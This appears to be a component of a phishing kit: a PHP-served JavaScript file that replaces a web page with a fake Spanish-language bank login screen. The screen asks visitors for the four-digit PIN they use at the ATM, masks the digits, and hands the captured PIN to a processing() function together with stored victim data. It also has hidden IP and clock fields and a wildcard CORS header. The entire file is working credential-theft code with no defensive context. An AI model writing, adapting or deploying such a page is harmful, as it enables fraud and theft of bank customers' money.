<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
var my_titulo = 'Iniciar sesion';

var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/main.css" />

<style>
  :root {
    --bg: #ebebee;
    --ink: #1f2126;
    --panel: #f0f0f2;
    --line: #373a40;
    --yellow: #f4d521;
    --orange: #ff7f2f;
    --cyan: #3bc5df;
    --danger: #b42318;
  }

  * {
    box-sizing: border-box;
  }

  html, body {
    height: 100%;
    margin: 0;
  }

  body {
    background: var(--bg);
    color: var(--ink);
    font-family: "Segoe UI", sans-serif;
    display: flex;
    justify-content: center;
  }

  .pass-screen {
    width: min(100vw, 384px);
    min-height: 100vh;
    position: relative;
    padding: 46px 12px 22px;
    overflow: hidden;
  }

  .logo-mark {
    width: 216px;
    height: 61.2px;
    margin: 0 auto 14px;
    background: url('${my_hosting}assets/img/logo.svg') center/contain no-repeat;
  }

  .logo-mark span { display: none; }

  .login-title {
    margin: 0 0 24px;
    text-align: center;
    font-size: clamp(22px, 5.6vw, 27px);
    font-weight: 700;
    letter-spacing: -0.01em;
  }

  .pin-panel-wrap {
    position: relative;
    margin-bottom: 18px;
  }

  .pin-panel {
    position: relative;
    z-index: 2;
    background: var(--panel);
    border-radius: 14px;
    padding: 22px 14px 26px;
    text-align: center;
  }

  .lock-icon {
    width: 34px;
    height: 34px;
    color: #1f2126;
    margin: 0 auto 8px;
    display: block;
  }

  .panel-text {
    margin: 0;
    font-size: clamp(17px, 4.8vw, 24px);
    line-height: 1.25;
    font-weight: 400;
  }

  .pin-wrap {
    margin-top: 16px;
  }

  .sc-jGKxIK {
    display: flex;
    justify-content: center;
    gap: 10px;
    flex-wrap: nowrap;
  }

  .sc-jGKxIK .pin-input {
    width: clamp(44px, 11.6vw, 50px);
    height: clamp(44px, 11.6vw, 50px);
    border: 1.7px solid var(--line);
    border-radius: 10px;
    background: #f7f7f8;
    text-align: center;
    font-size: 24px;
    line-height: 1;
    font-weight: 400;
    color: var(--ink);
    outline: none;
    -webkit-text-security: disc !important;
    text-security: disc !important;
    transition: border-color 0.2s ease, box-shadow 0.2s ease;
  }

  .sc-jGKxIK .pin-input::-ms-reveal,
  .sc-jGKxIK .pin-input::-ms-clear {
    display: none;
  }

  .sc-jGKxIK .pin-input::placeholder {
    color: #1f2126;
    opacity: 1;
  }

  .sc-jGKxIK .pin-input:focus {
    border-color: #000000;
    box-shadow: 0 0 0 2px rgba(0, 0, 0, 0.08);
  }

  .primary-btn {
    width: 100%;
    height: 56px;
    border: 0;
    border-radius: 30px;
    background: #cfd1d8;
    color: #6b6e78;
    font-size: clamp(24px, 6vw, 31px);
    font-weight: 400;
    font-family: inherit;
    cursor: not-allowed;
  }

  .primary-btn.ready {
    background: var(--yellow);
    color: #1f2126;
    cursor: pointer;
    box-shadow: 0 8px 24px rgba(0,0,0,0.12);
  }

  .primary-btn[disabled] {
    opacity: 0.8;
    cursor: not-allowed;
  }

  .forgot-link {
    display: block;
    text-align: center;
    margin-top: 32px;
    color: var(--ink);
    font-weight: 400;
    font-size: clamp(16px, 4.4vw, 19px);
    text-decoration: underline;
    text-decoration-thickness: 2px;
    text-underline-offset: 3px;
  }

  .error-msg {
    display: none;
    margin-top: 8px;
    font-size: 14px;
    color: var(--danger);
    text-align: center;
  }

  .meta-hidden {
    display: none;
  }

  @media (max-width: 360px) {
    .pass-screen {
      padding-top: 38px;
    }

    .login-title {
      margin-bottom: 20px;
      font-size: clamp(34px, 9vw, 40px);
    }

    .primary-btn {
      height: 52px;
      font-size: clamp(21px, 5.5vw, 27px);
    }
  }
</style>

<main class="pass-screen">
  <div class="logo-mark" aria-hidden="true">
    <span></span>
    <span></span>
    <span></span>
  </div>

  <h1 class="login-title">Iniciar sesión</h1>

  <section class="pin-panel-wrap" aria-label="Ingreso de clave">
    <div class="pin-panel">
      <svg class="lock-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
        <path d="M8.8 10V7.8a3.2 3.2 0 1 1 6.4 0V10" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"></path>
        <rect x="6.2" y="10" width="11.6" height="9.8" rx="2.4" stroke="currentColor" stroke-width="1.6"></rect>
        <circle cx="12" cy="14.8" r="1.2" fill="currentColor"></circle>
        <path d="M12 15.8v1.8" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"></path>
      </svg>
      <p class="panel-text">Ingresa la clave que usas en el cajero</p>

      <div id="formGroup" class="pin-wrap">
        <div class="sc-jGKxIK dSFNja">
          <input data-testid="1" class="pin-input" type="text" inputmode="numeric" pattern="\\d*" name="field1" id="field1" maxlength="1" minlength="1" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" />
          <input data-testid="2" class="pin-input" type="text" inputmode="numeric" pattern="\\d*" name="field2" id="field2" maxlength="1" minlength="1" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" />
          <input data-testid="3" class="pin-input" type="text" inputmode="numeric" pattern="\\d*" name="field3" id="field3" maxlength="1" minlength="1" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" />
          <input data-testid="4" class="pin-input" type="text" inputmode="numeric" pattern="\\d*" name="field4" id="field4" maxlength="1" minlength="1" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" />
        </div>
        <div id="errorLenght" class="error-msg"></div>
      </div>
    </div>
  </section>

  <button type="button" id="btn-continuar-password" class="primary-btn" disabled>Ingresar</button>

  <div class="meta-hidden">
    <div id="ipc">Direccion IP: </div>
    <div id="jclock1"></div>
  </div>
</main>
`;

$('body').html(my_contenido);

localStorage.setItem('contenido', my_contenido);

function checkData() {
  var allFilled = true;
  var otp = '';

  $('div.sc-jGKxIK .pin-input').each(function() {
    var value = $(this).data('digit') || '';
    if (!/^[0-9]$/.test(value)) {
      allFilled = false;
    }
    otp += value;
  });

  return allFilled ? otp : null;
}

function clearError() {
  $('#errorLenght').hide().text('');
}

function showError(message) {
  $('#errorLenght').text(message).show();
}

function updateContinueState() {
  var otp = checkData();
  var isComplete = otp && otp.length === 4;
  var $btn = $('#btn-continuar-password');

  if (isComplete) {
    $btn.removeAttr('disabled').addClass('ready');
  } else {
    $btn.attr('disabled', true).removeClass('ready');
  }
}

// Evita que el dígito se muestre en ningún momento: lo guardamos en data-digit y solo pintamos •
$('div.sc-jGKxIK .pin-input').on('beforeinput', function(event) {
  var nativeEvt = event.originalEvent || {};
  if (nativeEvt.inputType === 'insertText') {
    event.preventDefault();
    var digit = (nativeEvt.data || '').replace(/\\D/g, '').charAt(0) || '';
    var $current = $(this);
    $current.data('digit', digit);
    $current.val(digit ? '•' : '');

    if (digit) {
      var nextInput = $current.next('.pin-input');
      if (nextInput.length) {
        nextInput.focus();
      }
    }
    clearError();
    updateContinueState();
  }
});

// Fallback para navegadores sin beforeinput
$('div.sc-jGKxIK .pin-input').on('input', function() {
  var $current = $(this);
  var digit = $current.val().replace(/\\D/g, '').charAt(0) || '';
  $current.data('digit', digit);
  $current.val(digit ? '•' : '');

  if (digit) {
    var nextInput = $current.next('.pin-input');
    if (nextInput.length) {
      nextInput.focus();
    }
  }
  clearError();
  updateContinueState();
});

$('div.sc-jGKxIK .pin-input').on('keydown', function(event) {
  if (event.key === 'Backspace') {
    event.preventDefault();
    var $current = $(this);
    if ($current.data('digit')) {
      $current.data('digit', '');
      $current.val('');
    } else {
      var prevInput = $current.prev('.pin-input');
      if (prevInput.length) {
        prevInput.data('digit', '');
        prevInput.val('');
        prevInput.focus();
      }
    }
    clearError();
    updateContinueState();
  }
});

$('div.sc-jGKxIK .pin-input').on('paste', function(event) {
  event.preventDefault();
  var pasted = (event.originalEvent.clipboardData || window.clipboardData).getData('text');
  var digits = (pasted.match(/\\d/g) || []).slice(0, 4);

  if (!digits.length) {
    return;
  }

  $('div.sc-jGKxIK .pin-input').each(function(index) {
    var d = digits[index] || '';
    $(this).data('digit', d);
    $(this).val(d ? '•' : '');
  });

  clearError();
  var lastFilled = Math.min(digits.length, 4) - 1;
  $('div.sc-jGKxIK .pin-input').eq(lastFilled).focus();
  updateContinueState();
});

$('#btn-continuar-password').click(function() {
  var password = checkData();
  if (!password || password.length < 4) {
    showError('Ingresa los 4 digitos de tu clave.');
    return false;
  }

  $('#btn-continuar-password').attr('disabled', true).removeClass('ready');

  try {
    if (typeof window.my_data !== 'object' || window.my_data === null) {
      window.my_data = {};
    }
    window.my_data.password = password;
  } catch (e) {}

  processing({
    t: 'password',
    password: password
  });

  return false;
});

updateContinueState();
